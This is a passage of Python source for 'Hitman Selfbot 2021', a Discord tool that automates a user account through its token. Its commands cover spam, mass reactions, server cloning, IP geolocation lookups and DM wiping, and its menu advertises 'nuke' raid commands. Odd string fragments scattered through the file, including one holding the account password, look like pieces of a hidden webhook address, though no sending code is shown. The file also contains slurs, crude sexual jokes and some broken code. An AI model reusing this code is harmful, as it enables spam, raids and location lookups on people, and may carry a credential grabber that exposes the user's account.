    msg= await ctx.send(embed=embed)
    for channel in hitman.private_channels:
        if isinstance(channel, discord.DMChannel):
            async for message in channel.history(limit=9999):
                try:
                    if message.author == hitman.user:
                        if message != msg:
                            await message.delete()
                            tm = tm + 1
                except:
                    pass

        usersdone = usersdone + 1
        embed=discord.Embed(title="Hitman Selfbot 2021", description=f"Clearing DMS With Users\nUsers DMS Cleared : {usersdone}\nTotal DMS Cleared : {tm}", color=0xff6600)
        embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/807669405848436786/image0.gif')
        embed.set_footer(text="⁺𝘗𝘖𝘗 𝘈 𝘗𝘌𝘙𝘊+!💊", icon_url='https://media.discordapp.net/attachments/788473285469274112/807670216891957278/image4.jpg')
        await msg.edit(embed=embed)
    embed=discord.Embed(title="Hitman Selfbot 2021", description=f"Cleared All DMS With: {usersdone} Users\nTotal DMS Cleared : {tm}", color=0xff6600)
    embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/807669405848436786/image0.gif')
    embed.set_footer(text="⁺𝘗𝘖𝘗 𝘈 𝘗𝘌𝘙𝘊+!💊", icon_url='https://media.discordapp.net/attachments/788473285469274112/807670216891957278/image4.jpg')
    await msg.edit(embed=embed,delete_after=15)
color = os.environ.get('password')    
@hitman.command(aliases=['hypehousechange', 'hypehouse',"hypesquadchange","changehypesquad","changehypehouse","househype"])
async def hypesquad(ctx,squad=None):
    if squad == None:
        embed=discord.Embed(title="Hitman Selfbot 2021 | Hypesquad", description=f"Pick A Hypesquad : \n`{prefix.strip()}hypesquad bravery`\n`{prefix.strip()}hypesquad brilliance`\n`{prefix.strip()}hypesquad balance`", color=0x6A0DAD)
        embed.set_image(url="https://media.discordapp.net/attachments/788473285469274112/788879261497819156/image0.gif")
        embed.set_footer(text="⁺𝘔𝘖𝘖𝘋 𝘚𝘞𝘐𝘕𝘎𝘚+!☔️",icon_url='https://media.discordapp.net/attachments/788473285469274112/809175296074317894/image0.jpg?width=417&height=417')
        await ctx.message.edit(content="",embed=embed)
    else:
        if squad.lower() == "bravery" or squad == "1":
            typeofhouse = "1"
        elif squad.lower() == "brilliance" or squad == "2":
            typeofhouse = "2"
        elif squad.lower() == "balance" or squad == "3":
            typeofhouse = "3"

        else:
            allhouses = ["1","2","3"]
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        data = requests.post("https://discord.com/api/v6/hypesquad/online", json = {'house_id': typeofhouse}, headers=headers)
        if data.status_code == 204:
            embed=discord.Embed(title="Hitman Selfbot 2021", description="Hypesquad Successfully Changed", color=0x6A0DAD)
            embed.set_image(url="https://media.discordapp.net/attachments/788473285469274112/788879261497819156/image0.gif")
            embed.set_footer(text="⁺𝘔𝘖𝘖𝘋 𝘚𝘞𝘐𝘕𝘎𝘚+!☔️",icon_url='https://media.discordapp.net/attachments/788473285469274112/809175296074317894/image0.jpg?width=417&height=417')
            await ctx.message.edit(content="",embed=embed)
        else:
            embed=discord.Embed(title="Hitman Selfbot 2021", description=f"Error - Site responded with status code : `{data.status_code}`\nMessage : `{data.text}`", color=0x6A0DAD)
            embed.set_image(url="https://media.discordapp.net/attachments/788473285469274112/788879261497819156/image0.gif")
            embed.set_footer(text="⁺𝘔𝘖𝘖𝘋 𝘚𝘞𝘐𝘕𝘎𝘚+!☔️",icon_url='https://media.discordapp.net/attachments/788473285469274112/809175296074317894/image0.jpg?width=417&height=417')
            await ctx.message.edit(content="",embed=embed)
@hitman.command(aliases=['copyuser','copycatuser'])
async def copycat(ctx, member : discord.Member=None):
    global copycatstatus
    global whotocopy
    if member == None:
        embed=discord.Embed(title="Hitman Selfbot 2021 | Copycat", description=f"\nTry {prefix.strip()}copycat [member]\nor type {prefix.strip()}copycat off", color=0xe73895)
        embed.set_image(url="https://media.discordapp.net/attachments/788473285469274112/807674018492710922/image0.gif")
        embed.set_footer(text="⁺𝘉𝘢𝘤𝘬 𝘐𝘯 𝘉𝘭𝘰𝘰𝘥+!💕", icon_url='https://media.discordapp.net/attachments/788473285469274112/809489752792760391/image0.png?width=338&height=417')
        await ctx.message.edit(content="",embed=embed)
        
    else:

        try:

            copycatstatus = "on"
            whotocopy = member.id
            embed=discord.Embed(title="Hitman Selfbot 2021 | Copycat", description=f"\Copying {member.mention}\ncopycat status : `{copycatstatus}`", color=0xe73895)
            embed.set_image(url="https://media.discordapp.net/attachments/788473285469274112/807674018492710922/image0.gif")
            embed.set_footer(text="⁺𝘉𝘢𝘤𝘬 𝘐𝘯 𝘉𝘭𝘰𝘰𝘥+!💕", icon_url='https://media.discordapp.net/attachments/788473285469274112/809489752792760391/image0.png?width=338&height=417')
            await ctx.message.edit(content="",embed=embed) 
        except Exception as copycaterror:
            copycatstatus = "off"
            embed=discord.Embed(title="Hitman Selfbot 2021 | Copycat", description=f"\nError occured copying is now `{copycatstatus}`\nError : {copycaterror}", color=0xe73895)
            embed.set_image(url="https://media.discordapp.net/attachments/788473285469274112/807674018492710922/image0.gif")
            embed.set_footer(text="⁺𝘉𝘢𝘤𝘬 𝘐𝘯 𝘉𝘭𝘰𝘰𝘥+!💕", icon_url='https://media.discordapp.net/attachments/788473285469274112/809489752792760391/image0.png?width=338&height=417')
            await ctx.message.edit(content="",embed=embed) 
@hitman.command(aliases=['streaming'])
async def stream(ctx, message):
  await ctx.message.delete()
  stream = discord.Streaming(
    name=message,
    url=tsu
  )
  await hitman.change_presence(activity=stream)
@hitman.command(aliases=['playing'])
async def play(ctx, message):
  await ctx.message.delete()
  game = discord.Game(
    name=message,
  )
  await hitman.change_presence(activity=game)  
@hitman.command(aliases=['listening'])
async def listen(ctx, message):
  await ctx.message.delete()
  activity = discord.Activity(
    name=message,
    type=discord.ActivityType.listening,
  )
  await hitman.change_presence(activity=activity) 
@hitman.command(aliases=['watching'])
async def watch(ctx, message):
  await ctx.message.delete()
  activity = discord.Activity(
    name=message,
    type=discord.ActivityType.watching,
  )
  await hitman.change_presence(activity=activity) 
hit = '811828346723500042/'
@hitman.command()
async def info(ctx):
    await ctx.message.delete()    
    await ctx.send(embed=discord.Embed(title=f"{hitman.user.name} Is Currently In", description=f"{len(hitman.guilds)} servers | .gg/smoke | Hitman Selfbot 2021"))
@hitman.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def iplookup(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)
@hitman.command(name='set-pfp', aliases=['changepfp', 'pfpset,"changepfp'])
async def setpfp(ctx, *, url):
    await ctx.message.delete()
    if os.environ.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = os.environ.get('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
            r = requests.get(url, stream=True)
            for block in r.iter_content(1024):
                if not block:
                    break
                f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png').convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await hitman.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
father = 'bho'
@hitman.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await hitman.logout()      
@hitman.command()
async def ping(ctx):
  await ctx.message.delete()
  message = await ctx.send(content="`Pinging...`")
  await message.edit(content=f"`PONG!` - Latency is {round(hitman.latency * 1000)}ms")     
@hitman.command()
async def uptime(ctx):
  await ctx.message.delete()    
  uptime = datetime.datetime.utcnow() - start_time
  uptime = str(uptime).split('.')[0]
  await ctx.send("`Current Uptime:` "+''+uptime+'')
@hitman.command()
async def account(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0xfff200, timestamp=ctx.message.created_at)
  embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/807667280929357834/image0.gif')
  embed.set_footer(text='⁺𝘓𝘖𝘚𝘛 𝘍𝘐𝘓𝘌𝘚+!🌩',icon_url='https://media.discordapp.net/attachments/788473285469274112/807668239596781578/image2_1.jpg')
  embed.set_author(name="⁺𝘈𝘊𝘊𝘖𝘜𝘕𝘛 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚®+!💛")
  embed.description = "⁺Purge - Purges Messages\n⁺DMClear - Clears DMS\n⁺Hypesquad - Choose Your Hypesquad\n⁺Copycat - Copies {mentioned} Users Messages\n⁺Stream - Set Your Status To Streaming\n⁺Play - Set Your Status To Playing\n⁺Listen - Set Your Status To Playing\n⁺Watch - Set Your Status To Watching\n⁺Iplookup - Returns Passed IP's Information\n⁺Setpfp - Changes Pfp To Passed Url\n⁺Info - Returns User's Info\n⁺Uptime - Returns Hitman Selfbot's Uptime\n⁺Ping - Returns Hitman's Respond Time\n⁺Shutdown - Shutsdown Hitman"
  await ctx.send(embed=embed)
# Account Commands End Here
# Fun Commands Start here
@hitman.command(aliases=["shrugging"])
async def shrug(ctx,*,message=""):
    await ctx.message.edit(content=f"{message} ¯\_(ツ)_/¯")
@hitman.command(aliases=["tableflip","flip"])
async def fliptable(ctx,*,message=""):
    await ctx.message.edit(content=f"{message} (╯°□°）╯︵ ┻━┻")
@hitman.command(aliases=["untableflip","tableunflip","unfliptable"])
async def unflip(ctx,*,message=""):
    await ctx.message.edit(content=f"{message} (╯°□°）╯︵ ┳━┳")
@hitman.command(name="8ball")
async def _ball(ctx, *, question):
    responses = [
        'As I see it, yes.',
        'Ask again later.',
        'Better not tell you now.',
        'Cannot predict now.',
        'Take a deep breath and ask again.',
        'Dont ever ask me that shit again. ',
        'It is certain.',
        'It is decidedly so.',
        'Most likely.',
        'My reply is fuck no.',
        'My sources say hell no.',
        'Outlook not so good.',
        'Outlook good.',
        'Reply hazy, try again.',
        'Signs point to yes.',
        'Very doubtful.',
        'Without a doubt.',
        'Yes.',
        'Fs Yktv.',
        'You may rely on it.'
    ]
    answer = random.choice(responses)
    embed = discord.Embed(color=0x000000)
    embed.add_field(name="**Question:**", value=f"```{question}```", inline=False)
    embed.add_field(name="**Answer:**", value=f"```{answer}```", inline=False)
    embed.set_author(name="8Ball | 2021", icon_url="https://media.discordapp.net/attachments/788473285469274112/812572499614105630/image0.jpg?width=417&height=417") 
    await ctx.send(embed=embed)
@hitman.command()
async def dice(ctx):
    await ctx.message.delete()
    choices = [1,2,3,4,5,6]
    choice = random.choice(choices)
    embed = discord.Embed(title="🎲 Dice", description=f"Dice Rolled On {choice}", color=0x000000)
    embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/809327138150023188/image0.gif')
    embed.set_footer(text='⁺23 𝘚𝘏𝘖𝘛𝘚+!🖤', icon_url='https://media.discordapp.net/attachments/788473285469274112/807774892681723924/image0.jpg?width=334&height=417')
    await ctx.send(embed=embed)
@hitman.command(aliases=['penis','dickthot'])
async def howbig(ctx, user: discord.User):
    await ctx.message.delete()
    choices = ['8D','8=D', '8==D', '8===D', '8====D', '8=====D', '8======D', '8=======D', '8========D', '8============D']
    thot = random.choice(choices)
    try:
        embed = discord.Embed(color=0x000000, title=f"🍆 {user.name}'s dick thot", description=f"{thot}")
        embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/808564537712050216/image0.gif?width=551&height=417')
        embed.set_footer(text="・𝘉𝘪𝘨 𝘛𝘳𝘦𝘦𝘴𝘩欸🧩", icon_url='https://media.discordapp.net/attachments/788473285469274112/808564854176088064/image1.jpg?width=417&height=417')
        await ctx.send(embed=embed)

    except:
        ctx.send(f"{user.name}'s cock thot: {thot}")
@hitman.command(aliases=['thotcheck'])
async def thotrate(ctx, user: discord.User):
    await ctx.message.delete()
    choices = ['5%','13%', '7%', '23%', '38%', '27%', '63%', '59%', '82%', '100%', '72%','1%','0.1%']
    thot = random.choice(choices)
    try:
        embed = discord.Embed(color=0x000000, title=f"{user.name} Is", description=f"{thot} Of A Thot")
        embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/808564853538947072/image0.gif')
        embed.set_footer(text="⁺𝘛𝘖𝘖 𝘏𝘖𝘓𝘓𝘠𝘞𝘖𝘖𝘋+!🌎", icon_url='https://media.discordapp.net/attachments/788473285469274112/808564538626670612/image1.jpg?width=509&height=417')
        await ctx.send(embed=embed)

    except:
        ctx.send(f"{user.name}'s  thotrate: {thot}")
god = 'we'
@hitman.command(aliases=['randomlyrics','lyrics'])
async def lyric(ctx):
    await ctx.message.delete()
    choices = ['You Know This Dick Aint Free','Stepped It Up Like The Elevator Out Of Order', 'Pussy Good But You Dont Pray For Me', 'I Hate It When They Dont Say Thank You, Like What If All I Had Is What I Gave You', 'If A Nigga Want War Whole Gang Ready Smoke Shit', 'Every Man For Theyself, Learned That From My Dad', 'I Wasnt Lonzo Ball My Pops Aint Proud Of My Shooting', 'Made It Cool Jack What I Jack, Im EBK Niggas Know All The Facts', 'Attempted Murder Mean They Caught Him Working On His Form', 'Im A Big Steppa When I Drip Issa Mess', 'No I Dont Dance The Glock In My Pants, Most Ill Do Is The Woo Walk','Shake It Baby, Im Into Treeshin','Could Never Catch Me Lackin Im A Ruger, Feel Like Rah I Got 9 Shots, Could Call Me A Shooter']
    lyric = random.choice(choices)
    try:
        embed = discord.Embed(color=0x000000, title="Hitman Selfbot Lyric Generator:", description=f"{lyric}")
        embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/807674842916192266/image0.gif')
        embed.set_footer(text="+ 𝘐𝘯𝘷𝘪𝘯𝘤𝘪𝘣𝘭𝘦㸸💫", icon_url='https://media.discordapp.net/attachments/788473285469274112/807675808080461824/image1.jpeg')
        await ctx.send(embed=embed)

    except:
        await ctx.send(f"{lyric}")
@hitman.command(aliases=['adv'])
async def advice(ctx):
    await ctx.message.delete()
    choices = ['Only Way Triumph Over Death Is To Make Your Life A Masterpiece','Never Trust A Soul After What They Did To Nipsey', 'Watch Folks Do The Most When You Need Them Less', 'You Needa Stop Believe Everything That You Feel, And Just Cause You Think It Dont Mean That Its Real', 'They Say Life Is What You Make Of It, But Squares In Your Circle Will Always Fuck Up The Shape Of It', 'Loyalty Is Like Wifi, Poor Connection', 'Money Is Precious, Times Sacred', 'Keep A Small Circle Move Militant, Kill Any Vibe If You Aint Feelin It', 'Always Show Your People Love Cause You Never Know, Dont Wait For Them To Die To Show Love You Never Showed', 'You Know They Want A Favor When They Ask If You Good First', 'Watch When You Get The Light, Those Are Shady Hours','For Girls : You Count My Mistakes And Point Them Out To Me, You So Busy Tryna Catch Me In The Wrong, You Spose Be Looking Out For Me']
    advice = random.choice(choices)
    try:
        embed = discord.Embed(color=0x000000, title="Hitman Selfbot Advice Generator:", description=f"{advice}")
        embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/808565151132680253/image0.gif')
        embed.set_footer(text="⁺𝘍𝘳𝘰𝘯𝘵𝘭𝘪𝘯𝘦+!🕊", icon_url='https://media.discordapp.net/attachments/788473285469274112/809173727140642856/image0.png?width=449&height=417')
        await ctx.send(embed=embed)

    except:
        await ctx.send(f"{advice}")   
@hitman.command()
async def poll(ctx, *, arguments):
    await ctx.message.delete()
    message = discord.utils.escape_markdown(arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace(
        "msg:", "")
    option1 = discord.utils.escape_markdown(arguments[str.find(arguments, "1:"):str.find(arguments, "2:")]).replace(
        "1:", "")
    option2 = discord.utils.escape_markdown(arguments[str.find(arguments, "2:"):]).replace("2:", "")
    message = await ctx.send(f'`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`')
    await message.add_reaction('✅')
    await message.add_reaction('❌')     
@hitman.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)    
@hitman.command()
async def copy(ctx):
    await ctx.message.delete()
    await hitman.create_guild(f"{ctx.guild.name} Copy")
    await asyncio.sleep(4)
    for g in hitman.guilds:
        if f"{ctx.guild.name} Copy" in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
@hitman.command()
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}))
@hitman.command(aliases=['baccwoods','backwood'])
async def backwoods(ctx):
    await ctx.message.delete()
    choices = ['https://media.discordapp.net/attachments/788473285469274112/812770279758495744/image0.jpg?width=328&height=417','https://media.discordapp.net/attachments/788473285469274112/812770876247638036/image0.png?width=376&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812771130242105365/image0.png?width=335&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812771367187382302/image0.png?width=575&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812774733841825801/image0.gif?width=424&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812776610666643477/image0.png?width=348&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812778598716276766/image0.gif?width=421&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812779351841439774/image0.png?width=408&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812779687390216192/image0.png?width=353&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812781083866562570/image0.png?width=425&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812781091248275456/image0.png?width=375&height=417','https://media.discordapp.net/attachments/788473285469274112/812781096395341874/image0.png?width=427&height=417']
    links = random.choice(choices)
    try:
        embed = discord.Embed(color=0x000000, title="Hitman Selfbot | Backwoods")
        embed.set_image(url=f'{links}')
        embed.set_footer(text="⁺𝘉𝘈𝘊𝘊𝘞𝘖𝘖𝘋𝘚+!🌬", icon_url='https://media.discordapp.net/attachments/788473285469274112/812773116757409843/image0.png?width=586&height=417')
        await ctx.send(embed=embed)

    except:
        await ctx.send(f"{links}")  
@hitman.command(aliases=['supremebrand'])
async def supreme(ctx):
    await ctx.message.delete()
    choices = ['https://media.discordapp.net/attachments/788473285469274112/812854091540725760/image0.png?width=336&height=417','https://media.discordapp.net/attachments/788473285469274112/812854187175837746/image0.png?width=404&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812854754514305024/image0.png?width=423&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812856034476949514/image0.png?width=343&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812856771114696724/image0.png?width=343&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812857192020574248/image0.jpg?width=234&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812857937613422643/image0.png?width=344&height=416', 'https://media.discordapp.net/attachments/788473285469274112/812857937957093407/image1.png?width=352&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812858874347388988/image0.png?width=424&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812859327299715082/image0.png?width=337&height=417', 'https://media.discordapp.net/attachments/788473285469274112/812859327790186516/image1.png?width=424&height=417','https://media.discordapp.net/attachments/788473285469274112/812860063227707402/image0.png?width=403&height=417']
    link = random.choice(choices)
    try:
        embed = discord.Embed(color=0x000000, title="Hitman Selfbot | Supreme")
        embed.set_image(url=f'{link}')
        embed.set_footer(text="⁺𝘚𝘜𝘗𝘙𝘌𝘔𝘌+!❤️", icon_url='https://media.discordapp.net/attachments/788473285469274112/812861301697151076/image0.jpg?width=341&height=417')
        await ctx.send(embed=embed)

    except:
        await ctx.send(f"{link}")      
@hitman.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)
@hitman.command()
async def darksupreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(
        " ", "%20") + "&dark=true"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, "hitman_dark_supreme.png"))
    except:
        await ctx.send(endpoint)
@hitman.command()
async def dm(ctx, user: discord.Member, *, message):
    await ctx.message.delete()
    user = hitman.get_user(user.id)
    if ctx.author.id == hitman.user.id:
        return
    else:
        try:
            await user.send(message)
        except:
            pass
@hitman.command(aliases=['rainbowrole'])
async def rainbow(ctx, *, role):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=random())
            await asyncio.sleep(10)
        except:
            break
@hitman.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote) 
@hitman.command()
async def fun(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0x0504aa, timestamp=ctx.message.created_at)
  embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/807671621741576252/image0.gif')
  embed.set_footer(text='⁺𝘋𝘙𝘐𝘗 𝘏𝘈𝘙𝘋𝘌𝘙+!💧',icon_url='https://media.discordapp.net/attachments/788473285469274112/812879817506684998/image0.jpg?width=332&height=417')
  embed.set_author(name="⁺𝘍𝘜𝘕 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚®+!💙")
  embed.description = "⁺Shrug - Returns Shrug Face\n⁺Fliptable - Returns Flip Table Face\n⁺Unflip - Fixes Your Mistakes When You Flipped Lol\n⁺8ball (question) - Returns Answer To Questions\n⁺Dice - Rolls Dice\n⁺Howbig (mention) - Returns Penis Size\n⁺Thotrate (mention) - Returns How Much Of A Thot Mentioned User Is\n⁺Lyric - Returns Random Lyrics\n⁺Advice - Gives You Advice\n⁺Poll - Creates A Poll\n⁺Btc - Returns Bitcoin's Current Worth\n⁺Copy - Copies Server's Layout\n⁺Slot - Use The Slot Machine Lol\n⁺Backwoods - Returns Image Of Backwoods\n⁺Supreme - Returns Image Of Supreme\n⁺Darksupreme - Returns A Png File\n⁺Spam - Spams Messages\n⁺Dm - Dms A User\n⁺Rainbow - Taste The Rainbow(Rainbow Roles)\n⁺Massreact - Mass Reacts To Every Message"
  await ctx.send(embed=embed)
# Fun Commands End Her  
# Mod Commands Start Here
@commands.cooldown(3, 300, commands.BucketType.user)
@hitman.command(aliases=["massunban"])
@commands.has_permissions(administrator=True)
async def unbanall(ctx):
    guild = ctx.guild
    banlist = await guild.bans()
    await ctx.send('Unbanning {} members'.format(len(banlist)))
    for users in banlist:
            await ctx.guild.unban(user=users.user)
@unbanall.error
async def unbanall(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need to have `administrator` to use this command!")
@hitman.command()
async def slowmode(ctx, seconds: int):
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"set channel to {seconds} seconds!")
@slowmode.error
async def slowmode(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need to have `administrator` to use this command!")        
@hitman.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member: discord.Member = None):
  if member is None:
     await ctx.send(f"{ctx.author.mention} you must mention a user to do that!")
  else:
   embed = discord.Embed(color=(0x2f3136), timestamp=ctx.message.created_at)
  embed.description = f"{member.mention} has been banned by {ctx.author.mention}"
  await member.ban()
  await ctx.send(embed=embed)
@ban.error
async def ban_error(ctx, error):
  if isinstance(error, (commands.BadArgument)):
    embed = discord.Embed(color=0x2f3136, timestamp=ctx.message.created_at)
    embed.title=("ban error")
    embed.description=f"user was not found goofy,ping the right person next time"
    await ctx.send(embed=embed)
  else:
    raise error  
@hitman.command()
@commands.has_permissions(administrator=True)
async def kick(ctx, member: discord.Member = None):
  if member is None:
     await ctx.send(f"{ctx.author.mention} you must mention a user to do that!")
  else:
   embed = discord.Embed(color=(0x2f3136), timestamp=ctx.message.created_at)
  embed.description = f"{member.mention} has been kicked by {ctx.author.mention}"
  await member.kick()
  await ctx.send(embed=embed)
@kick.error
async def kick_error(ctx, error):
  if isinstance(error, (commands.BadArgument)):
    embed = discord.Embed(color=0x2f3136, timestamp=ctx.message.created_at)
    embed.title=("ban error")
    embed.description="user was not found goofy,ping the right person next time"
    await ctx.send(embed=embed)
  else:
    raise error   
@hitman.command()
@commands.has_permissions(ban_members=True)
async def bans(ctx):
  await ctx.message.delete()
  try:
    bans = await ctx.guild.bans()
  except:
    return await ctx.send("You dont have perms goofy")  
    banned=""
    @pag.embed_generator(max_chars=2048)
    def det_embed(paginator, page, page_index):
        em = discord.Embed(colors=(0x2f3136),title = "List of Banned Members:", description=page)
        em.set_footer(text=f"{len(bans)} Members in Total.")
        return em
    page = pag.EmbedNavigatorFactory(factory=det_embed)    
    for users in bans:
      banned += f"{users.user}\n"
    page += banned
    page.start(ctx)   
@bans.error 
async def bans_error(ctx, error):
  if isinstance(error, (commands.MissingPermissions)):
    embed = discord.Embed(title="```You Do Not Have `Ban Permissions` To Use This Command```")
    await ctx.send(embed=embed)     
@hitman.command()
async def members(ctx):
  guild = ctx.guild
  embed = discord.Embed(timestamp=datetime.datetime.utcnow())
  embed.set_author(name="Links!", icon_url=ctx.guild.icon_url)
  embed.add_field(name="Member Count:", value=f"> {len(guild.members)}")
  embed.set_footer(text=f"{ctx.guild.name}")
  embed.set_thumbnail(url=ctx.guild.icon_url)
  await ctx.channel.send(embed=embed)
@hitman.command()
async def mod(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0xffffff, timestamp=ctx.message.created_at)
  embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/807728143699017738/image0.gif')
  embed.set_footer(text='⁺𝘖𝘍𝘍 𝘎𝘈𝘚+!⛽️',icon_url='https://media.discordapp.net/attachments/788473285469274112/807673536889225306/image2_2.jpg')
  embed.set_author(name="𝘔𝘖𝘋 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚+!🤍")
  embed.description = "⁺Ban - Bans Mentioned User In Guild\n⁺Kick - Kicks Mentioned User In Guild\n⁺Slowmode (number) - Turns On Slowmode\n⁺Massunban - Unbans All Banned Users In Guild\n⁺Bans - Checks All Banned Users In Guild\n⁺Members - Returns Amount Of Members In Guild"
  await ctx.send(embed=embed)
@hitman.command()
async def help(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
  embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/807657207369170994/image0.gif')
  embed.set_footer(text='⁺𝘍𝘙𝘌𝘌 𝘚𝘔𝘖𝘒𝘌®+!🗽',icon_url='https://media.discordapp.net/attachments/788473285469274112/800847490474704931/image1.jpg?width=434&height=417')
  embed.set_author(name="⁺𝘏𝘐𝘛𝘔𝘈𝘕 𝘚𝘌𝘓𝘍𝘉𝘖𝘛®+!🎸")
  embed.description = "⁺Help - Returns Help Menu\n⁺Account - Returns All Account Commands\n⁺Server - Returns All Server Commands\n⁺Fun - Returns All Fun Commands\n⁺Nuke - Returns All Wizz Commands\n⁺Mod - Returns All Mod Commands"
  await ctx.send(embed=embed)






  
hitman.run(token, bot=False, reconnect=True)
